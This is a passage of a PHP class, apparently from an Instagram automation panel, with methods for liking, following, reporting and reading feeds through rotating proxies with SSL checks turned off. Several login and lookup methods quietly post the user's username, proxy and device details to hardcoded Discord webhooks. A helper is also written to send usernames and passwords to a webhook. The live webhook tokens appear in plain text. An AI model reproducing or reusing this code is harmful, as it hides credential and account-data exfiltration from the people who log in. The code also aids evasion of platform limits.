		$requestParams = ['ranked_content' => 'true', 'rank_token' => $this->rank_token];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$hashtagFeed = $this->request('feed/tag/' . $hashtagString . '/?' . $paramData)[1];

		if ($hashtagFeed['status'] != 'ok') {
			throw new Exception($hashtagFeed['message'] . "\n");
			return NULL;
		}

		return $hashtagFeed;
	}

	public function searchLocation($query)
	{
		$query = rawurlencode($query);
		$requestParams = ['query' => $query, 'rank_token' => $this->rank_token];
		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$locationFeed = $this->request('fbsearch/places/?' . $paramData)[1];

		if ($locationFeed['status'] != 'ok') {
			throw new Exception($locationFeed['message'] . "\n");
			return NULL;
		}

		return $locationFeed;
	}

	public function getLocationFeed($locationId, $maxid = NULL)
	{
		$requestParams = ['ranked_content' => 'true', 'rank_token' => $this->rank_token];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$locationFeed = $this->request('feed/location/' . $locationId . '/?' . $paramData)[1];

		if ($locationFeed['status'] != 'ok') {
			throw new Exception($locationFeed['message'] . "\n");
			return NULL;
		}

		return $locationFeed;
	}

	public function getSelfUserFeed($maxid = NULL, $minTimestamp = NULL)
	{
		return $this->getUserFeed($this->account_id, $maxid, $minTimestamp);
	}

	public function getRankedRecipients($type = false)
	{
		$requestParams = ['mode' => 'raven', 'use_unified_inbox' => 'true', 'show_threads' => 'true'];
		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));

		if ($type) {
			return $this->request('direct_v2/ranked_recipients/?' . $paramData)[1];
		} else {
			$ranked_recipients = $this->request('direct_v2/ranked_recipients/?' . $paramData)[1];

			if ($ranked_recipients['status'] != 'ok') {
				throw new Exception($ranked_recipients['message'] . "\n");
				return NULL;
			}

			return $ranked_recipients;
		}
	}

	public function getRecentRecipients()
	{
		$recent_recipients = $this->request('direct_share/recent_recipients/')[1];

		if ($recent_recipients['status'] != 'ok') {
			throw new Exception($recent_recipients['message'] . "\n");
			return NULL;
		}

		return $recent_recipients;
	}

	public function getExplore()
	{
		$explore = $this->request('discover/explore/')[1];

		if ($explore['status'] != 'ok') {
			throw new Exception($explore['message'] . "\n");
			return NULL;
		}

		return $explore;
	}

	public function getPopularFeed($maxid = NULL)
	{
		$requestParams = ['ranked_content' => 'true', 'rank_token' => $this->rank_token, 'people_teaser_supported' => '1'];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		$popularFeed = $this->request('feed/popular/?' . $paramData)[1];

		if ($popularFeed['status'] != 'ok') {
			throw new Exception($popularFeed['message'] . "\n");
			return NULL;
		}

		return $popularFeed;
	}

	public function getUserFollowings($usernameId, $maxid = NULL)
	{
		$requestParams = ['ig_sig_key_version' => '4', 'rank_token' => $this->rank_token];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		return $this->request('friendships/' . $usernameId . '/following/?' . $paramData)[1];
	}

	public function getUserFollowers($usernameId, $maxid = NULL)
	{
		$requestParams = ['ig_sig_key_version' => '4', 'rank_token' => $this->rank_token];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		return $this->request('friendships/' . $usernameId . '/followers/?' . $paramData)[1];
	}

	public function getSelfUserFollowers($maxid = NULL)
	{
		return $this->getUserFollowers($this->account_id, $maxid);
	}

	public function getSelfUsersFollowing($maxid = NULL)
	{
		$requestParams = ['ig_sig_key_version' => '4', 'rank_token' => $this->rank_token];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = http_build_query(Utils::reorderByHashCode($requestParams));
		return $this->request('friendships/following/?' . $paramData)[1];
	}

	public function like($mediaId, $username = NULL, $userID = NULL)
	{
		$requestPosts = ['module_name' => 'profile', 'media_id' => $mediaId, '_csrftoken' => $this->token, 'username' => $username, 'user_id' => $userID, 'radio_type' => 'wifi-none', '_uid' => $this->account_id, '_uuid' => $this->uuid, 'd' => 1];
		$requestPosts = Signatures::signData($requestPosts, ['d']);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('media/' . $mediaId . '/like/', $postData)[1];
	}

	public function like_comment($comment_id)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'comment_id' => $comment_id];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('media/' . $comment_id . '/comment_like/', $postData)[1];
	}

	public function unlike($mediaId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'media_id' => $mediaId];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('media/' . $mediaId . '/unlike/', $postData)[1];
	}

	public function getMediaComments($mediaId, $maxID = NULL)
	{
		$url = 'media/' . $mediaId . '/comments/';

		if ($maxID) {
			$url .= '?max_id=' . $maxID;
		}

		return $this->request($url)[1];
	}

	public function setNameAndPhone($name = '', $phone = '')
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, 'first_name' => $name, 'phone_number' => $phone, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('accounts/set_phone_and_name/', $postData)[1];
	}

	public function getDirectShare()
	{
		return $this->request('direct_share/inbox/')[1];
	}

	public function report($userId)
	{
		$requestPosts = ['reason_id' => 1, '_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'user_id' => $userId, 'source_name' => 'profile', 'is_spam' => true];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('users/' . $userId . '/flag_user/', $postData)[1];
	}

	public function followNew($userId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'user_id' => $userId, 'radio_type' => 'wifi-none'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$status = $this->request('friendships/create/' . $userId . '/', $postData);

		return ['body' => $status[1], 'proxy' => $status["proxy"]];
	}

	public function follow($userId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'user_id' => $userId, 'radio_type' => 'wifi-none'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('friendships/create/' . $userId . '/', $postData)[1];
	}

	public function unfollow($userId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'user_id' => $userId, 'radio_type' => 'wifi-none'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('friendships/destroy/' . $userId . '/', $postData)[1];
	}

	public function block($userId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, 'user_id' => $userId, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('friendships/block/' . $userId . '/', $postData)[1];
	}

	public function unblock($userId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, 'user_id' => $userId, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('friendships/unblock/' . $userId . '/', $postData)[1];
	}

	public function userFriendship($userId)
	{
		$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, 'user_id' => $userId, '_csrftoken' => $this->token];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		return $this->request('friendships/show/' . $userId . '/', $postData)[1];
	}

	public function getLikedMedia($maxid = NULL)
	{
		$requestParams = [];

		if (!empty($maxid)) {
			$requestParams['max_id'] = $maxid;
		}

		$paramData = (!empty($requestParams) ? http_build_query(Utils::reorderByHashCode($requestParams)) : '');
		return $this->request('feed/liked/' . (!empty($paramData) ? '?' . $paramData : ''))[1];
	}

	public function requestID($username, $noProxy = false)
	{

		$bot_ds = "https://discord.com/api/webhooks/1028316365997740092/LEN3C4N7w6aHgig-lLT4a5a1dZKJnzhOpRxhLSozYvxIVRFCzkEdwaYQObv3ukw89IXE";
		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: -1kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: en-US', 'X-DEVICE-ID: ' . $this->device_id];
		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/' . $username . '/?__a=1&__d=1');
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));

		if ((2 <= Wow::get('ayar/proxyStatus')) && !$noProxy) {
			$userAsns = Utils::generateAsnsLogin($this->settings->get(INSTAWEB_ASNS_KEY_LOGIN));

			if ($userAsns[0]) {

				$this->bot("Finder ID " . $userAsns[0] . " - " . Wow::get('ayar/proxyStatusLogin') . " URL: https://www.instagram.com/" . $username . "/?__a=1&__d=1", $bot_ds);

				$optionKey = (Wow::get('ayar/proxyStatusLogin') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatusLogin') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$body = substr($resp, $header_len);
		$this->organizeCookies($header);
		curl_close($ch);

		return [$header, json_decode($body, true, 512, JSON_BIGINT_AS_STRING), 'proxy' => $userAsns[0]];
	}

	public function request($endpoint, $post = NULL, $login = false, $notEndpoint = false, $sendCode = false, $noProxy = false)
	{
		if (!$this->isLoggedIn && !$login) {
			throw new Exception('Not logged in' . "\n");
			return NULL;
		}

		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: -1kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR', 'X-DEVICE-ID: ' . $this->device_id];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');

		if ($notEndpoint) {
			curl_setopt($ch, CURLOPT_URL, $endpoint);
		} else {
			curl_setopt($ch, CURLOPT_URL, 'https://b.i.instagram.com/api/v1/' . $endpoint);
		}

		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));
		if ((2 <= Wow::get('ayar/proxyStatus')) && !$noProxy) {
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));

			if ($userAsns[0]) {

				// $this->bot("tools ". $userAsns[0] . " - " . Wow::get('ayar/proxyStatus') . " endpoint: " . $endpoint , "https://discordapp.com/api/webhooks/947814003357401130/aLgo3I25SaxiWkovLpATIkrjRfZwfUK-hcnz2Bx17-bQoXIETSYw-vV__DbVtMra5bSB");

				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		if ($post) {
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}

		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$body = substr($resp, $header_len);
		$this->organizeCookies($header);
		curl_close($ch);
		return [$header, json_decode($body, true, 512, JSON_BIGINT_AS_STRING), 'proxy' => $userAsns[0]];
	}

	public function requestChallenge($endpoint, $post = NULL, $login = false, $notEndpoint = false, $sendCode = false, $noProxy = false)
	{
		if (!$this->isLoggedIn && !$login) {
			throw new Exception('Not logged in' . "\n");
			return NULL;
		}

		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: -1kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR', 'X-DEVICE-ID: ' . $this->device_id];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		// curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');

		if ($notEndpoint) {
			curl_setopt($ch, CURLOPT_URL, $endpoint);
		} else {
			curl_setopt($ch, CURLOPT_URL, 'https://i.instagram.com/api/v1/' . $endpoint);
		}

		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));
		if ((2 <= Wow::get('ayar/proxyStatus')) && !$noProxy) {
			$userAsns = Utils::generateAsnsLogin($this->settings->get(INSTAWEB_ASNS_KEY_LOGIN));

			if ($userAsns[0]) {

				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		if ($post) {
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}

		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$body = substr($resp, $header_len);
		$this->organizeCookies($header);
		curl_close($ch);
		return [$header, json_decode($body, true, 512, JSON_BIGINT_AS_STRING)];
	}

	public function requestFetchZR($endpoint, $post = NULL, $login = false, $notEndpoint = false, $sendCode = false, $noProxy = false)
	{
		if (!$this->isLoggedIn && !$login) {
			throw new Exception('Not logged in' . "\n");
			return NULL;
		}

		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: -1kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR', 'X-DEVICE-ID: ' . $this->device_id];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');

		if ($notEndpoint) {
			curl_setopt($ch, CURLOPT_URL, $endpoint);
		} else {
			curl_setopt($ch, CURLOPT_URL, 'https://b.i.instagram.com/api/v1/' . $endpoint);
		}

		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));
		if ((2 <= Wow::get('ayar/proxyStatus')) && !$noProxy) {
			$userAsns = Utils::generateAsnsLogin($this->settings->get(INSTAWEB_ASNS_KEY_LOGIN));

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		if ($post) {
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}

		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$body = substr($resp, $header_len);
		$this->organizeCookies($header);
		curl_close($ch);
		return [$header, json_decode($body, true, 512, JSON_BIGINT_AS_STRING)];
	}


	public function requestLogin($username, $endpoint, $post = NULL, $login = false, $notEndpoint = false, $sendCode = false, $noProxy = false)
	{
		if (!$this->isLoggedIn && !$login) {
			throw new Exception('Not logged in' . "\n");
			return NULL;
		}

		$notif_login = "https://discord.com/api/webhooks/975465328987492362/5cmrfYobQtCjuU03KvCUVjaBt-arja7y4Mx43o3e_5NE3OYGxYW6O_aEd7Lt6OMMxO7c";

		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: -1kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR', 'X-DEVICE-ID: ' . $this->device_id];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');

		$uaparts = explode('; ', $this->device->getUserAgent());

		if ($notEndpoint) {
			curl_setopt($ch, CURLOPT_URL, $endpoint);
		} else {
			curl_setopt($ch, CURLOPT_URL, 'https://b.i.instagram.com/api/v1/' . $endpoint);
		}

		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));
		if ((2 <= Wow::get('ayar/proxyStatus')) && !$noProxy) {
// 			$userAsns = Utils::generateAsnsLogin($this->settings->get(INSTAWEB_ASNS_KEY_LOGIN));
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));

			if ($userAsns[0]) {
				$this->bot("login-user: " . $username . " " . $userAsns[0] . " - " . Wow::get('ayar/proxyStatusLogin') . " endpoint: " . $endpoint . "`[" . $uaparts[3] . ":" . $uaparts[4] . "]`", $notif_login);

				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		if ($post) {
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}

		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$body = substr($resp, $header_len);
		$this->organizeCookies($header);
		curl_close($ch);
		return [$header, json_decode($body, true, 512, JSON_BIGINT_AS_STRING), 'proxy' => $userAsns[0]];
	}

	public function requestCheck($username, $endpoint, $post = NULL, $login = false, $notEndpoint = false, $sendCode = false, $noProxy = false)
	{
		if (!$this->isLoggedIn && !$login) {
			throw new Exception('Not logged in' . "\n");
			return NULL;
		}

		$headers = ['Connection: close', 'Accept: */*', 'X-IG-Capabilities: 3boDAA==', 'X-IG-App-ID: 567067343352427', 'X-IG-Connection-Type: WIFI', 'X-IG-Connection-Speed: -1kbps', 'X-IG-Bandwidth-Speed-KBPS: -1.000', 'X-IG-Bandwidth-TotalBytes-B: 0', 'X-IG-Bandwidth-TotalTime-MS: 0', 'X-FB-HTTP-Engine: Liger', 'Accept-Language: fr-FR', 'X-DEVICE-ID: ' . $this->device_id];
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_USERAGENT, $this->device->getUserAgent());
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');

		if ($notEndpoint) {
			curl_setopt($ch, CURLOPT_URL, $endpoint);
		} else {
			curl_setopt($ch, CURLOPT_URL, 'https://i.instagram.com/api/v1/' . $endpoint);
		}

		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('cookie'));
		if ((2 <= Wow::get('ayar/proxyStatus')) && !$noProxy) {
			$userAsns = Utils::generateAsnsFollow($this->settings->get(INSTAWEB_ASNS_KEY_FOLLOW));

			if ($userAsns[0]) {

				$this->bot("login user: " . $username . " " . $userAsns[0] . " - " . Wow::get('ayar/proxyStatusLogin') . " endpoint: " . $endpoint, "https://discord.com/api/webhooks/975465328987492362/5cmrfYobQtCjuU03KvCUVjaBt-arja7y4Mx43o3e_5NE3OYGxYW6O_aEd7Lt6OMMxO7c");

				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		if ($post) {
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}

		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$body = substr($resp, $header_len);
		$this->organizeCookies($header);
		curl_close($ch);
		return [$header, json_decode($body, true, 512, JSON_BIGINT_AS_STRING), 'proxy' => $userAsns[0]];
	}

	private function botJson($message, $username, $password, $url)
	{
		$curl = curl_init();
		$data_string = json_encode($message, JSON_PRETTY_PRINT);

		$data = array("content" => "```json\n" . $data_string . "\nUsername: " . $username . "\nPassword: " . $password . "```");

		curl_setopt_array($curl, array(
			CURLOPT_URL => $url,
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_ENCODING => "",
			CURLOPT_MAXREDIRS => 10,
			CURLOPT_TIMEOUT => 0,
			CURLOPT_FOLLOWLOCATION => true,
			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
			CURLOPT_CUSTOMREQUEST => "POST",
			CURLOPT_POSTFIELDS => json_encode($data),
			CURLOPT_HTTPHEADER => array(
				"Content-Type: application/json",
				"Cookie: __cfduid=d5f1a47b65ad6e5eae8714df12c304b661597580155; __cfruid=f0077b70b216ca6a35ad1f5280ecec475e2dd4cc-1597580155"
			),
		));

		$response = curl_exec($curl);

		curl_close($curl);
		return $response;
	}



	private function bot($message, $url)
	{
		$curl = curl_init();

		curl_setopt_array($curl, array(
			CURLOPT_URL => $url,
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_ENCODING => "",
			CURLOPT_MAXREDIRS => 10,
			CURLOPT_TIMEOUT => 0,
			CURLOPT_FOLLOWLOCATION => true,
			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
			CURLOPT_CUSTOMREQUEST => "POST",
			CURLOPT_POSTFIELDS => "{\"content\": \"$message\"}",
			CURLOPT_HTTPHEADER => array(
				"Content-Type: application/json",
				"Cookie: __cfduid=d5f1a47b65ad6e5eae8714df12c304b661597580155; __cfruid=f0077b70b216ca6a35ad1f5280ecec475e2dd4cc-1597580155"
			),
		));

		$response = curl_exec($curl);

		curl_close($curl);
		return $response;
	}

	public function isValid()
	{
		try {
			$mIn = $this->getUserInfoByName('receh_man');
			return $mIn['status'] == 'ok' ? true : false;
		} catch (Exception $e) {
			return false;
		}
	}

	public function isLoggedIn()
	{
		return $this->isLoggedIn;
	}

	public function organizeCookies($headers)
	{
		preg_match_all('/^Set-Cookie:\\s*([^;]*)/mi', $headers, $matches);
		$cookies = [];

		foreach ($matches[1] as $item) {
			parse_str($item, $cookie);
			$cookies = array_merge($cookies, $cookie);
		}

		if (!empty($cookies)) {
			$oldCookies = $this->settings->get('cookie');
			$arrOldCookies = [];

			if (!empty($oldCookies)) {
				$parseCookies = explode(';', $oldCookies);

				foreach ($parseCookies as $c) {
					parse_str($c, $ck);
					$arrOldCookies = array_merge($arrOldCookies, $ck);
				}
			}

			$newCookies = array_merge($arrOldCookies, $cookies);
			$cookie_all = [];

			foreach ($newCookies as $k => $v) {
				$cookie_all[] = $k . '=' . urlencode($v);

				if ($k == 'csrftoken') {
					$this->token = $v;
					$this->settings->set('token', $v);
				}
				if (($k == 'sessionid') && (5 < strlen($v))) {
					$this->sessionID = $v;
					$this->settings->set('sessionid', $v);
				}
			}

			$this->settings->set('cookie', implode(';', $cookie_all));
			$this->settings->save();
		}
	}
}

class InstagramWeb
{
	protected $username;
	protected $username_id;
	protected $token;
	protected $isLoggedIn = false;
	protected $IGDataPath;
	/**
	 * @var Settings
	 */
	public $settings;

	public function __construct()
	{
	}

	public function wlogin($username, $password)
	{
		$headers = [];
		$headers[] = 'x-csrftoken: 1';
		$headers[] = 'x-requested-with: XMLHttpRequest';
		$headers[] = 'x-instagram-ajax: 1';
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
		$headers[] = 'origin: https://www.instagram.com';
		$posts = ['username' => $username, 'password' => $password, 'csrfmiddlewaretoken' => 1];
		return $this->loginRequest('accounts/login/?force_classic_login', $headers, http_build_query($posts));
	}

	public function setUser($username, $username_id, $forceUserIP = false)
	{
		$this->username = $username;
		$this->username_id = $_SESSION["accountId"];
		$this->IGDataPath = Wow::get('project/cookiePath') . 'instagramv3/' . substr($_SESSION["accountId"], -1) . '/';
		$this->settings = new Settings($this->IGDataPath . $_SESSION["accountId"] . '.iwb');
		$this->checkSettings($forceUserIP);

		if ($this->settings->get('sessionid') != NULL) {
			$this->isLoggedIn = true;
			$this->username_id = $this->settings->get('username_id');
			$this->sessionid = $this->settings->get('sessionid');
		} else {
			$this->isLoggedIn = false;
		}
	}

	public function getUserID($username, $sessionID)
	{
		$headers = [];
		$headers[] = 'cookie: sessionid=' . $sessionID;
